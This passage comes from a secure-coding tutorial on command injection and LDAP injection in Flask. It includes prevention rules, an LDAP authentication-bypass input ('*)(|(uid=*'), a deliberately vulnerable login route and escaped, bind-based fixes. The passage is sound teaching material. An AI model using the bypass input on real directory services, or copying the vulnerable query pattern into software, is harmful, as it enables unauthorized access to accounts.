    <span class="k">if</span> <span class="ow">not</span> <span class="n">re</span><span class="o">.</span><span class="n">match</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;^[a-zA-Z0-9.\-]+$&#39;</span><span class="p">,</span> <span class="n">domain</span><span class="p">):</span>
        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&quot;error&quot;</span><span class="p">:</span> <span class="s2">&quot;Invalid domain&quot;</span><span class="p">}),</span> <span class="mi">400</span>

    <span class="c1"># Defense 2: Use Python library instead of shell command</span>
    <span class="kn">import</span><span class="w"> </span><span class="nn">socket</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">result</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">getaddrinfo</span><span class="p">(</span><span class="n">domain</span><span class="p">,</span> <span class="kc">None</span><span class="p">)</span>
        <span class="n">ips</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="nb">set</span><span class="p">(</span><span class="n">addr</span><span class="p">[</span><span class="mi">4</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span> <span class="k">for</span> <span class="n">addr</span> <span class="ow">in</span> <span class="n">result</span><span class="p">))</span>
        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&quot;domain&quot;</span><span class="p">:</span> <span class="n">domain</span><span class="p">,</span> <span class="s2">&quot;addresses&quot;</span><span class="p">:</span> <span class="n">ips</span><span class="p">})</span>
    <span class="k">except</span> <span class="n">socket</span><span class="o">.</span><span class="n">gaierror</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&quot;error&quot;</span><span class="p">:</span> <span class="s2">&quot;DNS resolution failed&quot;</span><span class="p">}),</span> <span class="mi">400</span>


<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/api/resize-image-secure&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
<span class="k">def</span><span class="w"> </span><span class="nf">resize_image_secure</span><span class="p">():</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;FIXED: Safe command with shlex.quote for unavoidable shell usage.&quot;&quot;&quot;</span>
    <span class="n">filename</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">json</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;filename&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
    <span class="n">width</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">json</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;width&#39;</span><span class="p">,</span> <span class="mi">800</span><span class="p">)</span>

    <span class="c1"># Validate filename (no path traversal)</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">re</span><span class="o">.</span><span class="n">match</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;^[a-zA-Z0-9_\-]+\.(jpg|png|gif)$&#39;</span><span class="p">,</span> <span class="n">filename</span><span class="p">):</span>
        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&quot;error&quot;</span><span class="p">:</span> <span class="s2">&quot;Invalid filename&quot;</span><span class="p">}),</span> <span class="mi">400</span>

    <span class="c1"># Validate width</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">width</span><span class="p">,</span> <span class="nb">int</span><span class="p">)</span> <span class="ow">or</span> <span class="ow">not</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;=</span> <span class="n">width</span> <span class="o">&lt;=</span> <span class="mi">4096</span><span class="p">):</span>
        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&quot;error&quot;</span><span class="p">:</span> <span class="s2">&quot;Invalid width&quot;</span><span class="p">}),</span> <span class="mi">400</span>

    <span class="c1"># If you MUST use shell (avoid if possible), use shlex.quote</span>
    <span class="n">safe_filename</span> <span class="o">=</span> <span class="n">shlex</span><span class="o">.</span><span class="n">quote</span><span class="p">(</span><span class="n">filename</span><span class="p">)</span>
    <span class="n">safe_width</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">width</span><span class="p">))</span>

    <span class="c1"># But prefer list form:</span>
    <span class="n">result</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">(</span>
        <span class="p">[</span><span class="s2">&quot;convert&quot;</span><span class="p">,</span> <span class="sa">f</span><span class="s2">&quot;uploads/</span><span class="si">{</span><span class="n">filename</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">,</span> <span class="s2">&quot;-resize&quot;</span><span class="p">,</span> <span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">safe_width</span><span class="si">}</span><span class="s2">x&quot;</span><span class="p">,</span>
         <span class="sa">f</span><span class="s2">&quot;resized/</span><span class="si">{</span><span class="n">filename</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">],</span>
        <span class="n">capture_output</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span>
        <span class="n">text</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span>
        <span class="n">timeout</span><span class="o">=</span><span class="mi">30</span><span class="p">,</span>
    <span class="p">)</span>

    <span class="k">if</span> <span class="n">result</span><span class="o">.</span><span class="n">returncode</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&quot;error&quot;</span><span class="p">:</span> <span class="s2">&quot;Conversion failed&quot;</span><span class="p">}),</span> <span class="mi">500</span>

    <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&quot;status&quot;</span><span class="p">:</span> <span class="s2">&quot;resized&quot;</span><span class="p">})</span>
</code></pre></div>

<h3 id="53-command-injection-prevention-rules">5.3 Command Injection Prevention Rules<a class="header-link" href="#53-command-injection-prevention-rules" title="Permanent link">&para;</a></h3>
<div class="highlight"><pre><span></span><code><span class="err">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”</span>
<span class="err">â”‚</span><span class="w">          </span><span class="nx">Command</span><span class="w"> </span><span class="nx">Injection</span><span class="w"> </span><span class="nx">Prevention</span><span class="w">                            </span><span class="err">â”‚</span>
<span class="err">â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤</span>
<span class="err">â”‚</span><span class="w">                                                                  </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="mi">1</span><span class="p">.</span><span class="w"> </span><span class="nx">AVOID</span><span class="w"> </span><span class="nx">shell</span><span class="w"> </span><span class="nx">commands</span><span class="w"> </span><span class="nx">entirely</span><span class="w">                                </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">     </span><span class="nx">Use</span><span class="w"> </span><span class="nx">Python</span><span class="w"> </span><span class="nx">libraries</span><span class="w"> </span><span class="nx">instead</span><span class="p">:</span><span class="w">                                </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">     </span><span class="o">-</span><span class="w"> </span><span class="nx">os</span><span class="p">.</span><span class="nx">system</span><span class="p">(</span><span class="s">&quot;ping X&quot;</span><span class="p">)</span><span class="w">  </span><span class="err">â†’</span><span class="w"> </span><span class="nx">subprocess</span><span class="p">.</span><span class="nx">run</span><span class="p">([</span><span class="s">&quot;ping&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">X</span><span class="p">])</span><span class="w">       </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">     </span><span class="o">-</span><span class="w"> </span><span class="nx">os</span><span class="p">.</span><span class="nx">system</span><span class="p">(</span><span class="s">&quot;nslookup&quot;</span><span class="p">)</span><span class="err">â†’</span><span class="w"> </span><span class="nx">socket</span><span class="p">.</span><span class="nx">getaddrinfo</span><span class="p">()</span><span class="w">              </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">     </span><span class="o">-</span><span class="w"> </span><span class="nx">os</span><span class="p">.</span><span class="nx">system</span><span class="p">(</span><span class="s">&quot;convert&quot;</span><span class="p">)</span><span class="w"> </span><span class="err">â†’</span><span class="w"> </span><span class="nx">Pillow</span><span class="w"> </span><span class="kn">library</span><span class="w">                     </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">     </span><span class="o">-</span><span class="w"> </span><span class="nx">os</span><span class="p">.</span><span class="nx">system</span><span class="p">(</span><span class="s">&quot;curl&quot;</span><span class="p">)</span><span class="w">    </span><span class="err">â†’</span><span class="w"> </span><span class="nx">requests</span><span class="w"> </span><span class="kn">library</span><span class="w">                   </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">                                                                  </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="mi">2</span><span class="p">.</span><span class="w"> </span><span class="nx">If</span><span class="w"> </span><span class="nx">shell</span><span class="w"> </span><span class="k">is</span><span class="w"> </span><span class="nx">unavoidable</span><span class="p">:</span><span class="w">                                     </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">     </span><span class="o">-</span><span class="w"> </span><span class="nx">Use</span><span class="w"> </span><span class="nx">subprocess</span><span class="p">.</span><span class="nx">run</span><span class="p">()</span><span class="w"> </span><span class="nx">with</span><span class="w"> </span><span class="nx">list</span><span class="w"> </span><span class="nx">arguments</span><span class="w">                  </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">     </span><span class="o">-</span><span class="w"> </span><span class="nx">NEVER</span><span class="w"> </span><span class="nx">use</span><span class="w"> </span><span class="nx">shell</span><span class="p">=</span><span class="nx">True</span><span class="w">                                      </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">     </span><span class="o">-</span><span class="w"> </span><span class="nx">Use</span><span class="w"> </span><span class="nx">shlex</span><span class="p">.</span><span class="nx">quote</span><span class="p">()</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="nx">last</span><span class="w"> </span><span class="nx">resort</span><span class="w">                          </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">     </span><span class="o">-</span><span class="w"> </span><span class="nx">Set</span><span class="w"> </span><span class="nx">timeout</span><span class="w">                                                </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">                                                                  </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="mi">3</span><span class="p">.</span><span class="w"> </span><span class="nx">Validate</span><span class="w"> </span><span class="nx">input</span><span class="p">:</span><span class="w">                                              </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">     </span><span class="o">-</span><span class="w"> </span><span class="nx">Whitelist</span><span class="w"> </span><span class="nx">allowed</span><span class="w"> </span><span class="nx">characters</span><span class="w"> </span><span class="p">(</span><span class="nx">alphanumeric</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">limited</span><span class="w"> </span><span class="nx">set</span><span class="p">)</span><span class="w"> </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">     </span><span class="o">-</span><span class="w"> </span><span class="nx">Validate</span><span class="w"> </span><span class="nx">against</span><span class="w"> </span><span class="nx">expected</span><span class="w"> </span><span class="nx">format</span><span class="w"> </span><span class="p">(</span><span class="nx">IP</span><span class="p">,</span><span class="w"> </span><span class="nx">domain</span><span class="p">,</span><span class="w"> </span><span class="nx">filename</span><span class="p">)</span><span class="w">   </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">     </span><span class="o">-</span><span class="w"> </span><span class="nx">Reject</span><span class="w"> </span><span class="nx">any</span><span class="w"> </span><span class="nx">input</span><span class="w"> </span><span class="nx">with</span><span class="w"> </span><span class="nx">shell</span><span class="w"> </span><span class="nx">metacharacters</span><span class="w">                </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">                                                                  </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">  </span><span class="mi">4</span><span class="p">.</span><span class="w"> </span><span class="nx">Principle</span><span class="w"> </span><span class="nx">of</span><span class="w"> </span><span class="nx">least</span><span class="w"> </span><span class="nx">privilege</span><span class="p">:</span><span class="w">                                </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">     </span><span class="o">-</span><span class="w"> </span><span class="nx">Run</span><span class="w"> </span><span class="nx">application</span><span class="w"> </span><span class="nx">with</span><span class="w"> </span><span class="nx">minimal</span><span class="w"> </span><span class="nx">OS</span><span class="w"> </span><span class="nx">permissions</span><span class="w">               </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">     </span><span class="o">-</span><span class="w"> </span><span class="nx">Use</span><span class="w"> </span><span class="nx">containers</span><span class="o">/</span><span class="nx">sandboxes</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="nx">command</span><span class="w"> </span><span class="nx">execution</span><span class="w">             </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">     </span><span class="o">-</span><span class="w"> </span><span class="nx">Drop</span><span class="w"> </span><span class="nx">capabilities</span><span class="w"> </span><span class="p">(</span><span class="nx">no</span><span class="w"> </span><span class="nx">network</span><span class="p">,</span><span class="w"> </span><span class="nx">no</span><span class="w"> </span><span class="nx">filesystem</span><span class="w"> </span><span class="nx">write</span><span class="p">)</span><span class="w">       </span><span class="err">â”‚</span>
<span class="err">â”‚</span><span class="w">                                                                  </span><span class="err">â”‚</span>
<span class="err">â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜</span>
</code></pre></div>

<hr />
<h2 id="6-ldap-injection">6. LDAP Injection<a class="header-link" href="#6-ldap-injection" title="Permanent link">&para;</a></h2>
<h3 id="61-how-ldap-injection-works">6.1 How LDAP Injection Works<a class="header-link" href="#61-how-ldap-injection-works" title="Permanent link">&para;</a></h3>
<p>LDAP (Lightweight Directory Access Protocol) injection occurs when user input is used to construct LDAP queries without proper sanitization, similar to SQL injection but targeting directory services.</p>
<div class="highlight"><pre><span></span><code>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚              LDAP Injection                                       â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                                  â”‚
â”‚  Normal LDAP query:                                              â”‚
â”‚  (&amp;(uid=alice)(userPassword=secret123))                         â”‚
â”‚                                                                  â”‚
â”‚  Attack (bypass authentication):                                 â”‚
â”‚  Username: alice)(|(uid=*                                        â”‚
â”‚  Password: anything                                              â”‚
â”‚                                                                  â”‚
â”‚  Resulting query:                                                â”‚
â”‚  (&amp;(uid=alice)(|(uid=*)(userPassword=anything))                 â”‚
â”‚                                                                  â”‚
â”‚  This matches ANY user because (uid=*) is always true           â”‚
â”‚                                                                  â”‚
â”‚  LDAP Special Characters:                                        â”‚
â”‚  *    â†’ Wildcard (any value)                                    â”‚
â”‚  (    â†’ Filter group start                                      â”‚
â”‚  )    â†’ Filter group end                                        â”‚
â”‚  \    â†’ Escape character                                        â”‚
â”‚  NUL  â†’ Null byte                                               â”‚
â”‚  /    â†’ DN separator                                            â”‚
â”‚                                                                  â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre></div>

<h3 id="62-vulnerable-and-fixed-code">6.2 Vulnerable and Fixed Code<a class="header-link" href="#62-vulnerable-and-fixed-code" title="Permanent link">&para;</a></h3>
<div class="highlight"><pre><span></span><code><span class="sd">&quot;&quot;&quot;</span>
<span class="sd">ldap_injection.py - LDAP injection vulnerability and prevention</span>
<span class="sd">&quot;&quot;&quot;</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">ldap3</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">re</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">flask</span><span class="w"> </span><span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">jsonify</span>

<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>

<span class="n">LDAP_SERVER</span> <span class="o">=</span> <span class="s2">&quot;ldap://ldap.example.com&quot;</span>
<span class="n">LDAP_BASE_DN</span> <span class="o">=</span> <span class="s2">&quot;dc=example,dc=com&quot;</span>


<span class="c1"># ==============================================================</span>
<span class="c1"># VULNERABLE: String concatenation in LDAP query</span>
<span class="c1"># ==============================================================</span>

<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/api/ldap-login-vulnerable&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
<span class="k">def</span><span class="w"> </span><span class="nf">ldap_login_vulnerable</span><span class="p">():</span>
    <span class="n">username</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">json</span><span class="p">[</span><span class="s1">&#39;username&#39;</span><span class="p">]</span>
    <span class="n">password</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">json</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">]</span>

    <span class="c1"># VULNERABLE: Direct string interpolation</span>
    <span class="n">search_filter</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;(&amp;(uid=</span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s2">)(userPassword=</span><span class="si">{</span><span class="n">password</span><span class="si">}</span><span class="s2">))&quot;</span>

    <span class="n">server</span> <span class="o">=</span> <span class="n">ldap3</span><span class="o">.</span><span class="n">Server</span><span class="p">(</span><span class="n">LDAP_SERVER</span><span class="p">)</span>
    <span class="n">conn</span> <span class="o">=</span> <span class="n">ldap3</span><span class="o">.</span><span class="n">Connection</span><span class="p">(</span><span class="n">server</span><span class="p">,</span> <span class="n">auto_bind</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
    <span class="n">conn</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">LDAP_BASE_DN</span><span class="p">,</span> <span class="n">search_filter</span><span class="p">)</span>

    <span class="k">if</span> <span class="n">conn</span><span class="o">.</span><span class="n">entries</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&quot;status&quot;</span><span class="p">:</span> <span class="s2">&quot;authenticated&quot;</span><span class="p">})</span>
    <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&quot;error&quot;</span><span class="p">:</span> <span class="s2">&quot;Invalid credentials&quot;</span><span class="p">}),</span> <span class="mi">401</span>

<span class="c1"># Attack: username = &quot;*)(|(uid=*&quot;  â†’ Bypasses authentication</span>


<span class="c1"># ==============================================================</span>
<span class="c1"># FIXED: Input sanitization for LDAP</span>
<span class="c1"># ==============================================================</span>

<span class="k">def</span><span class="w"> </span><span class="nf">ldap_escape</span><span class="p">(</span><span class="n">value</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;</span>
<span class="sd">    Escape special characters for LDAP filter strings.</span>
<span class="sd">    Per RFC 4515, section 3.</span>
<span class="sd">    &quot;&quot;&quot;</span>
    <span class="n">escaped</span> <span class="o">=</span> <span class="n">value</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\\</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\\</span><span class="s1">5c&#39;</span><span class="p">)</span>  <span class="c1"># Must be first</span>
    <span class="n">escaped</span> <span class="o">=</span> <span class="n">escaped</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;*&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\\</span><span class="s1">2a&#39;</span><span class="p">)</span>
    <span class="n">escaped</span> <span class="o">=</span> <span class="n">escaped</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;(&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\\</span><span class="s1">28&#39;</span><span class="p">)</span>
    <span class="n">escaped</span> <span class="o">=</span> <span class="n">escaped</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;)&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\\</span><span class="s1">29&#39;</span><span class="p">)</span>
    <span class="n">escaped</span> <span class="o">=</span> <span class="n">escaped</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\\</span><span class="s1">00&#39;</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">escaped</span>


<span class="k">def</span><span class="w"> </span><span class="nf">ldap_dn_escape</span><span class="p">(</span><span class="n">value</span><span class="p">:</span> <span class="nb">str</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">str</span><span class="p">:</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;Escape special characters for LDAP Distinguished Names.&quot;&quot;&quot;</span>
    <span class="n">special_chars</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;,&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\\</span><span class="s1">&#39;</span><span class="p">,</span> <span class="s1">&#39;#&#39;</span><span class="p">,</span> <span class="s1">&#39;+&#39;</span><span class="p">,</span> <span class="s1">&#39;&lt;&#39;</span><span class="p">,</span> <span class="s1">&#39;&gt;&#39;</span><span class="p">,</span> <span class="s1">&#39;;&#39;</span><span class="p">,</span> <span class="s1">&#39;&quot;&#39;</span><span class="p">,</span> <span class="s1">&#39;=&#39;</span><span class="p">]</span>
    <span class="n">escaped</span> <span class="o">=</span> <span class="n">value</span>
    <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">special_chars</span><span class="p">:</span>
        <span class="n">escaped</span> <span class="o">=</span> <span class="n">escaped</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="n">char</span><span class="p">,</span> <span class="sa">f</span><span class="s1">&#39;</span><span class="se">\\</span><span class="si">{</span><span class="n">char</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
    <span class="c1"># Leading/trailing spaces</span>
    <span class="k">if</span> <span class="n">escaped</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">):</span>
        <span class="n">escaped</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="se">\\</span><span class="s1"> &#39;</span> <span class="o">+</span> <span class="n">escaped</span><span class="p">[</span><span class="mi">1</span><span class="p">:]</span>
    <span class="k">if</span> <span class="n">escaped</span><span class="o">.</span><span class="n">endswith</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">):</span>
        <span class="n">escaped</span> <span class="o">=</span> <span class="n">escaped</span><span class="p">[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\\</span><span class="s1"> &#39;</span>
    <span class="k">return</span> <span class="n">escaped</span>


<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/api/ldap-login-secure&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
<span class="k">def</span><span class="w"> </span><span class="nf">ldap_login_secure</span><span class="p">():</span>
    <span class="n">username</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">json</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;username&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>
    <span class="n">password</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">json</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;password&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">)</span>

    <span class="c1"># Defense 1: Input validation</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">re</span><span class="o">.</span><span class="n">match</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;^[a-zA-Z0-9._-]+$&#39;</span><span class="p">,</span> <span class="n">username</span><span class="p">):</span>
        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&quot;error&quot;</span><span class="p">:</span> <span class="s2">&quot;Invalid username format&quot;</span><span class="p">}),</span> <span class="mi">400</span>

    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">username</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">64</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&quot;error&quot;</span><span class="p">:</span> <span class="s2">&quot;Username too long&quot;</span><span class="p">}),</span> <span class="mi">400</span>

    <span class="c1"># Defense 2: Escape LDAP special characters</span>
    <span class="n">safe_username</span> <span class="o">=</span> <span class="n">ldap_escape</span><span class="p">(</span><span class="n">username</span><span class="p">)</span>

    <span class="c1"># Defense 3: Use LDAP bind for authentication instead of search</span>
    <span class="c1"># This is the recommended approach - let LDAP server verify password</span>
    <span class="n">server</span> <span class="o">=</span> <span class="n">ldap3</span><span class="o">.</span><span class="n">Server</span><span class="p">(</span><span class="n">LDAP_SERVER</span><span class="p">)</span>
    <span class="n">user_dn</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;uid=</span><span class="si">{</span><span class="n">ldap_dn_escape</span><span class="p">(</span><span class="n">username</span><span class="p">)</span><span class="si">}</span><span class="s2">,ou=users,</span><span class="si">{</span><span class="n">LDAP_BASE_DN</span><span class="si">}</span><span class="s2">&quot;</span>

    <span class="k">try</span><span class="p">:</span>
        <span class="c1"># LDAP bind attempts to authenticate directly</span>
        <span class="n">conn</span> <span class="o">=</span> <span class="n">ldap3</span><span class="o">.</span><span class="n">Connection</span><span class="p">(</span>
            <span class="n">server</span><span class="p">,</span> <span class="n">user</span><span class="o">=</span><span class="n">user_dn</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="n">password</span><span class="p">,</span> <span class="n">auto_bind</span><span class="o">=</span><span class="kc">True</span>
        <span class="p">)</span>
        <span class="n">conn</span><span class="o">.</span><span class="n">unbind</span><span class="p">()</span>
        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&quot;status&quot;</span><span class="p">:</span> <span class="s2">&quot;authenticated&quot;</span><span class="p">})</span>
    <span class="k">except</span> <span class="n">ldap3</span><span class="o">.</span><span class="n">core</span><span class="o">.</span><span class="n">exceptions</span><span class="o">.</span><span class="n">LDAPBindError</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&quot;error&quot;</span><span class="p">:</span> <span class="s2">&quot;Invalid credentials&quot;</span><span class="p">}),</span> <span class="mi">401</span>
    <span class="k">except</span> <span class="n">ldap3</span><span class="o">.</span><span class="n">core</span><span class="o">.</span><span class="n">exceptions</span><span class="o">.</span><span class="n">LDAPException</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s2">&quot;error&quot;</span><span class="p">:</span> <span class="s2">&quot;Authentication service error&quot;</span><span class="p">}),</span> <span class="mi">500</span>


<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/api/ldap-search-secure&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">])</span>
<span class="k">def</span><span class="w"> </span><span class="nf">ldap_search_secure</span><span class="p">():</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;Secure LDAP search with properly escaped filters.&quot;&quot;&quot;</span>
